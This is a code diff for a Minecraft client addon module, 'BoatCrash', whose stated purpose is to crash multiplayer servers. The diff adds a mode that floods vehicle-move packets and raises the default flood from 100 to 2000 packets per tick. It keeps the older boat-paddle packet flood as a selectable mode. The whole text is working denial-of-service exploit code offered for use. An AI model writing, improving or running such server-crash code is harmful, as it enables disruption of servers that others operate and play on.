@@ -8,34 +8,43 @@
 
 package widecat.meteorcrashaddon.modules;
 
-/*
-Ported from Cornos to Crash Addon by Wide_Cat
-https://github.com/0x151/Cornos/blob/master/src/main/java/me/zeroX150/cornos/features/module/impl/exploit/crash/BoatCrash.java
- */
-
+import meteordevelopment.meteorclient.settings.*;
+import widecat.meteorcrashaddon.CrashAddon;
 import meteordevelopment.meteorclient.events.game.GameLeftEvent;
 import meteordevelopment.meteorclient.events.world.PlaySoundEvent;
 import meteordevelopment.meteorclient.events.world.TickEvent;
-import meteordevelopment.meteorclient.settings.BoolSetting;
-import meteordevelopment.meteorclient.settings.IntSetting;
-import meteordevelopment.meteorclient.settings.Setting;
-import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
 import net.minecraft.entity.Entity;
 import net.minecraft.entity.vehicle.BoatEntity;
 import net.minecraft.network.packet.c2s.play.BoatPaddleStateC2SPacket;
-import widecat.meteorcrashaddon.CrashAddon;
+import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Vec3d;
+
+import static widecat.meteorcrashaddon.modules.BoatCrash.Mode.Shit;
 
 public class BoatCrash extends Module {
+    public enum Mode {
+        Shit,
+        New
+    }
+
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
+
+    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
+        .name("mode")
+        .description("Which crash method to use.")
+        .defaultValue(Mode.New)
+        .build()
+    );
 
     private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
         .name("amount")
         .description("How many packets to send to the server per tick.")
-        .defaultValue(100)
-        .min(1)
-        .sliderMax(1000)
+        .defaultValue(2000)
+        .min(1000)
+        .sliderMax(8000)
         .build()
     );
 
@@ -43,6 +52,7 @@ public class BoatCrash extends Module {
         .name("no-sound")
         .description("Blocks the noisy paddle sounds.")
         .defaultValue(false)
+        .visible(() -> mode.get() == Shit)
         .build()
     );
 
@@ -52,8 +62,6 @@ public class BoatCrash extends Module {
         .defaultValue(true)
         .build()
     );
-
-    private final BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);
 
     public BoatCrash() {
         super(CrashAddon.CATEGORY, "boat-crash", "Tries to crash the server when you are in a boat. (By 0x150)");
@@ -67,9 +75,20 @@ public class BoatCrash extends Module {
             toggle();
             return;
         }
-
-        for (int i = 0; i < amount.get(); i++) {
-            mc.getNetworkHandler().sendPacket(PACKET);
+        if (mode.get() == Mode.Shit) {
+            BoatPaddleStateC2SPacket PACKET = new BoatPaddleStateC2SPacket(true, true);
+            for (int i = 0; i < amount.get(); i++) {
+                mc.getNetworkHandler().sendPacket(PACKET);
+            }
+        } else {
+        Entity vehicle = mc.player.getVehicle();
+        BlockPos start = mc.player.getBlockPos();
+        Vec3d end = new Vec3d(start.getX() + .5, start.getY() + 1, start.getZ() + .5);
+        vehicle.updatePosition(end.x, end.y - 1, end.z);
+        VehicleMoveC2SPacket PACKET2 = new VehicleMoveC2SPacket(vehicle);
+            for (int i = 0; i < amount.get(); i++) {
+                mc.getNetworkHandler().sendPacket(PACKET2);
+            }
         }
     }
 
